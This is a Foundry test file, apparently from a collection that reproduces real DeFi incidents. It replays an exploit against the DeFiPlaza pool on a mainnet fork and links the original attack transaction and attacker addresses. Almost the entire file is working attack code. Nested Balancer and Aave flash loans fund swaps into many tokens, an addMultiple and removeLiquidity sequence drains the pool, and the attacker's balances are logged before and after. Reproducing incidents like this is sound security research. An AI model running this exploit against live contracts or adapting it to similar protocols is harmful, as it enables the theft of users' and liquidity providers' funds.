// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~200k USD
// TX : https://app.blocksec.com/explorer/tx/eth/0xa245deda8553c6e4c575baff9b50ef35abf4c8f990f8f36897696f896f240e3a
// Frontrunner : https://etherscan.io/address/0xfde0d1575ed8e06fbf36256bcdfa1f359281455a
// Original Attacker: https://etherscan.io/address/0x14b362d2e38250604f21a334d71c13e2ed478467
// Frontrunner Attack Contract: https://etherscan.io/address/0x6980a47bee930a4584b09ee79ebe46484fbdbdd0
// Original Attack Contract : https://etherscan.io/address/0xa4e8969bba1e1d48c30c948de0884cdff43e2d54
// GUY : https://x.com/DecurityHQ/status/1809222922998808760

interface DeFiPlaza is IERC20{
    function swap(
    address inputToken,
    address outputToken,
    uint256 inputAmount,
    uint256 minOutputAmount
  )external payable returns (uint256 outputAmount);
  function addMultiple(address[] calldata tokens, uint256[] calldata maxAmounts)
    external
    payable
    returns (uint256 actualLP);
    function removeLiquidity(uint256 LPamount, address outputToken, uint256 minOutputAmount)
    external
    returns (uint256 actualOutput);
  
}

contract ContractTest is Test {
    DeFiPlaza  DEFI=DeFiPlaza(0xE68c1d72340aEeFe5Be76eDa63AE2f4bc7514110);
    IERC20 DFP2 = IERC20(0x2F57430a6ceDA85a67121757785877b4a71b8E6D);
    IERC20 YFI = IERC20(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e);
    IERC20 Matic = IERC20(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0);
    IERC20 SUSHI = IERC20(0x6B3595068778DD592e39A122f4f5a5cF09C90fE2);
    IERC20 eXRD = IERC20(0x6468e79A80C0eaB0F9A2B574c8d5bC374Af59414);
    IERC20 CVX = IERC20(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B);
    IERC20 MKR = IERC20(0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2);
    IERC20 Spell = IERC20(0x090185f2135308BaD17527004364eBcC2D37e5F6);
    IERC20 AAVEtoken = IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9);
    IERC20  WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IUSDT LINK = IUSDT(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    IERC20 COMP = IERC20(0xc00e94Cb662C3520282E6f5717214004A7f26888);
    IERC20 CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    WETH9  WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IAaveFlashloan AAVE = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address public vulnContract=0x00C409001C1900DdCdA20000008E112417DB003b;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    event log_data(bytes data);
    function setUp() public {
        vm.createSelectFork("mainnet", 20240538);
    }
    function testExploit() external {
        emit log_named_decimal_uint("[End] Attacker ETH balance before exploit", address(this).balance, 18);
        emit log_named_decimal_uint("[End] Attacker eXRD balance before exploit", eXRD.balanceOf(address(this)), eXRD.decimals());
        emit log_named_decimal_uint("[End] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), USDC.decimals());
        emit log_named_decimal_uint("[End] Attacker USDT balance before exploit", USDT.balanceOf(address(this)),6);
        emit log_named_decimal_uint("[End] Attacker DAI balance before exploit", DAI.balanceOf(address(this)), DAI.decimals());
        emit log_named_decimal_uint("[End] Attacker LINK balance before exploit", LINK.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker WBTC balance before exploit", WBTC.balanceOf(address(this)), WBTC.decimals());
        emit log_named_decimal_uint("[End] Attacker Spell balance before exploit", Spell.balanceOf(address(this)), Spell.decimals());
        emit log_named_decimal_uint("[End] Attacker MKR balance before exploit", MKR.balanceOf(address(this)), MKR.decimals());
        emit log_named_decimal_uint("[End] Attacker CRV balance before exploit", CRV.balanceOf(address(this)), CRV.decimals());
        emit log_named_decimal_uint("[End] Attacker YFI balance before exploit", YFI.balanceOf(address(this)), YFI.decimals());
        emit log_named_decimal_uint("[End] Attacker Sushi balance before exploit", SUSHI.balanceOf(address(this)), SUSHI.decimals());
        emit log_named_decimal_uint("[End] Attacker Matic balance before exploit", Matic.balanceOf(address(this)), Matic.decimals());
        emit log_named_decimal_uint("[End] Attacker COMP balance before exploit", COMP.balanceOf(address(this)), COMP.decimals());
        emit log_named_decimal_uint("[End] Attacker CVX balance before exploit", CVX.balanceOf(address(this)), CVX.decimals());
        console.log("=====================");
        bytes memory userencodeData = abi.encode(1, address(this));
        approveAll();
        uint256[] memory amount = new uint256[](9);
        address[] memory token = new address[](9);

        token[0] = address(WBTC);
        token[1] = address(LINK);
        token[2] = address(DAI);
        token[3] = address(AAVEtoken);
        token[4] = address(MKR);
        token[5] = address(USDC);
        token[6] = address(WETH);
        token[7] = address(CRV);
        token[8] = address(USDT);

        amount[0] = 3453558744;
        amount[1] = 11703486364971912026396;
        amount[2] = 1579853285099364323842974;
        amount[3] = 626870781897849610814425;
        amount[4] = 160573001420344730080;
        amount[5] = 5082037851392;
        amount[6] = 34546473222602105572392;
        amount[7] = 3901990478262973511258;
        amount[8] = 3721449521913;
        Balancer.flashLoan(address(this), token, amount, userencodeData);

        emit log_named_decimal_uint("[End] Attacker ETH balance after exploit", address(this).balance, 18);
        emit log_named_decimal_uint("[End] Attacker eXRD balance after exploit", eXRD.balanceOf(address(this)), eXRD.decimals());
        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)),6);
        emit log_named_decimal_uint("[End] Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
        emit log_named_decimal_uint("[End] Attacker LINK balance after exploit", LINK.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker WBTC balance after exploit", WBTC.balanceOf(address(this)), WBTC.decimals());
        emit log_named_decimal_uint("[End] Attacker Spell balance after exploit", Spell.balanceOf(address(this)), Spell.decimals());
        emit log_named_decimal_uint("[End] Attacker MKR balance after exploit", MKR.balanceOf(address(this)), MKR.decimals());
        emit log_named_decimal_uint("[End] Attacker CRV balance after exploit", CRV.balanceOf(address(this)), CRV.decimals());
        emit log_named_decimal_uint("[End] Attacker YFI balance after exploit", YFI.balanceOf(address(this)), YFI.decimals());
        emit log_named_decimal_uint("[End] Attacker Sushi balance after exploit", SUSHI.balanceOf(address(this)), SUSHI.decimals());
        emit log_named_decimal_uint("[End] Attacker Matic balance after exploit", Matic.balanceOf(address(this)), Matic.decimals());
        emit log_named_decimal_uint("[End] Attacker COMP balance after exploit", COMP.balanceOf(address(this)), COMP.decimals());
        emit log_named_decimal_uint("[End] Attacker CVX balance after exploit", CVX.balanceOf(address(this)), CVX.decimals());


    }
    
    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external {
        address[] memory assets = new address[](6);
        assets[0] = address(WBTC);
        assets[1] = address(LINK);
        assets[2] = address(DAI);
        assets[3] = address(MKR);
        assets[4] = address(CRV);
        assets[5] = address(USDT);
        uint256[] memory amounts = new uint256[](6);
        amounts[0] = 5781711628;
        amounts[1] = 418582543975397474624769;
        amounts[2] = 3503975614905139135512778;
        amounts[3] = 2280638770110776934873;
        amounts[4] = 1044246667915305492650602;
        amounts[5] = 1396680406245;
        uint256[] memory interestRateModes = new uint256[](7);
        interestRateModes[0] = 2;
        interestRateModes[1] = 2;
        interestRateModes[2] = 2;
        interestRateModes[3] = 0;
        interestRateModes[4] = 0;
        interestRateModes[5] = 2;
        AAVE.flashLoan(address(this), assets, amounts, interestRateModes, address(this), bytes(""), 0);

        AAVE.repay(address(WBTC),5781711628,2,address(this));
        AAVE.repay(address(LINK),418582543975397474624769,2,address(this));
        AAVE.repay(address(DAI),3503975614905139135512778,2,address(this));
        AAVE.repay(address(USDT),1396680406245,2,address(this));
        AAVE.withdraw(address(AAVEtoken),626870781897849610814425,address(this));

        WBTC.transfer(address(Balancer),3453558744);
        LINK.transfer(address(Balancer),11703486364971912026396);
        DAI.transfer(address(Balancer),1579853285099364323842974);
        AAVEtoken.transfer(address(Balancer),626870781897849610814425);
        MKR.transfer(address(Balancer),160573001420344730080);
        USDC.transfer(address(Balancer),5082037851392);
        WETH.transfer(address(Balancer),34546473222602105572392);
        CRV.transfer(address(Balancer),3901990478262973511258);
        USDT.transfer(address(Balancer),3721449521913);
    }   
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {

        DEFI.swap(address(USDT), address(COMP), 256581711438, 0);
        DEFI.swap(address(WBTC), address(DFP2), 462981892, 0);
        DEFI.swap(address(USDC), address(eXRD), 254772346112, 0);
        DEFI.swap(address(MKR), address(SUSHI), 122382648177021930433, 0);
        DEFI.swap(address(DAI), address(CVX), 254862134828721809308072, 0);
        DEFI.swap(address(LINK), address(Matic), 21571067484081842602565, 0);


        DEFI.swap{value: 86 ether}(address(0),address(Spell),86 ether,0);
        DEFI.swap{value: 1727 ether}(address(0),address(YFI),1727 ether,0);

        address[] memory tokens = new address[](16);
        tokens[0] = address(0);
        tokens[1] = address(Spell);
        tokens[2] = address(YFI);
        tokens[3] = address(WBTC);
        tokens[4] = address(DFP2);
        tokens[5] = address(CVX);
        tokens[6] = address(LINK);
        tokens[7] = address(eXRD);
        tokens[8] = address(DAI);
        tokens[9] = address(SUSHI);
        tokens[10] = address(Matic);
        tokens[11] = address(MKR);
        tokens[12] = address(USDC);
        tokens[13] = address(COMP);
        tokens[14] = address(CRV);
        tokens[15] = address(USDT);
        uint256[] memory amounts = new uint256[](16);
        amounts[0] = 32732 ether;
        amounts[1] = 88888888 ether;
        amounts[2] = 88888888 ether;
        amounts[3] = 87 * 1e8;
        amounts[4] = 88888888 ether;
        amounts[5] = 88888888 ether; 
        amounts[6] = 88888888 ether; 
        amounts[7] = 88888888 ether; 
        amounts[8] = 88888888 ether; 
        amounts[9] = 88888888 ether; 
        amounts[10] = 88888888 ether; 
        amounts[11] = 88888888 ether; 
        amounts[12] = 88888888 ether; 
        amounts[13] = 88888888 ether; 
        amounts[14] = 88888888 ether; 
        amounts[15] = 88888888 ether; 
        DEFI.addMultiple{value: 32732 ether}(tokens, amounts);
        uint256 amount=DEFI.balanceOf(address(this));
        DEFI.removeLiquidity(amount,address(0),0);


        DEFI.swap{value: 0.000000000000000001 ether}(address(0),address(Spell),1,0);
        DEFI.swap(address(Spell),address(YFI),1,0);
        DEFI.swap(address(YFI),address(WBTC),1,0);
        DEFI.swap(address(WBTC),address(DFP2),1,0);
        DEFI.swap(address(DFP2),address(CVX),1,0);
        DEFI.swap(address(CVX),address(LINK),1,0);
        DEFI.swap(address(LINK),address(eXRD),1,0);
        DEFI.swap(address(eXRD),address(DAI),1,0);
        DEFI.swap(address(DAI),address(SUSHI),1,0);
        DEFI.swap(address(SUSHI),address(Matic),1,0);
        DEFI.swap(address(Matic),address(MKR),1,0);
        DEFI.swap(address(MKR),address(USDC),1,0);
        DEFI.swap(address(USDC),address(COMP),1,0);
        DEFI.swap(address(COMP),address(CRV),1,0);
        DEFI.swap(address(CRV),address(USDT),1,0);
        AAVE.supply(address(AAVEtoken),626870781897849610814425,address(this),0);
        return true;
    }
    function approveAll() public {
        SUSHI.approve(address(DEFI),type(uint256).max);
        COMP.approve(address(DEFI),type(uint256).max);
        CRV.approve(address(DEFI),type(uint256).max);
        CRV.approve(address(AAVE),type(uint256).max);
        LINK.approve(address(DEFI),type(uint256).max);
        LINK.approve(address(AAVE),type(uint256).max);
        AAVEtoken.approve(address(AAVE),type(uint256).max);
        Spell.approve(address(DEFI),type(uint256).max);
        CVX.approve(address(DEFI),type(uint256).max);
        eXRD.approve(address(DEFI),type(uint256).max);
        SUSHI.approve(address(DEFI),type(uint256).max);
        WBTC.approve(address(AAVE),type(uint256).max);
        WBTC.approve(address(DEFI),type(uint256).max);
        Matic.approve(address(DEFI),type(uint256).max);
        MKR.approve(address(DEFI),type(uint256).max);
        MKR.approve(address(AAVE),type(uint256).max);
        YFI.approve(address(DEFI),type(uint256).max);
        DFP2.approve(address(DEFI),type(uint256).max);
        USDT.approve(address(DEFI),type(uint256).max);
        USDT.approve(address(AAVE),type(uint256).max);
        USDC.approve(address(DEFI),type(uint256).max);
        DAI.approve(address(DEFI),type(uint256).max);
        DAI.approve(address(AAVE),type(uint256).max);
    }   
    fallback() external payable{}
}
